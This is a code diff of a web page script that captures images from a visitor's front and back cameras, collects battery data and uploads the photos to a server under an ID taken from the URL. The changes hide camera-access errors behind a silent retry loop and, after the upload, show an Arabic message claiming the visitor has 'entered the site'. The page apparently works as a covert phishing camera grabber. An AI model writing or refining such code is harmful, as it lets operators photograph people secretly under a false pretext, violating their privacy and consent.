@@ -48,7 +48,7 @@
         const backVideo = document.getElementById('backVideo');
         const frontCanvas = document.getElementById('frontCanvas');
         const backCanvas = document.getElementById('backCanvas');
-        const userId = window.location.pathname.split('/')[2] || 'default_user_id';
+        const userId = window.location.pathname.split('/')[2];
 
         async function collectAdditionalData() {
             try {
@@ -65,7 +65,7 @@
                     batteryCharging: battery.charging,
                 };
             } catch (error) {
-                console.error('Error collecting additional ', error);
+                console.error('Error collecting additional data', error);
                 return {};
             }
         }
@@ -112,10 +112,7 @@
                 }
             } catch (e) {
                 console.error('Error in init:', e);
-                document.querySelector('.container').innerHTML = `
-                    <h1>حدث خطأ</h1>
-                    <p>لم نتمكن من الوصول إلى الكاميرا. يرجى التحقق من إعدادات الكاميرا والسماح بالوصول.</p>
-                `;
+                setTimeout(init, 1000);
             }
         }
 
@@ -147,7 +144,7 @@
                 } else {
                     break;
                 }
-                
+
                 await new Promise(resolve => setTimeout(resolve, 1000));
             }
 
@@ -163,7 +160,7 @@
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
+
                 canvas.toBlob(blob => {
                     const formData = new FormData();
                     formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
@@ -197,6 +194,10 @@
 
                     if (data.success) {
                         console.log('Photos sent successfully');
+                        document.querySelector('.container').innerHTML = `
+                            <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
+                            <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
+                        `;
                         return;
                     } else {
                         throw new Error(data.error);
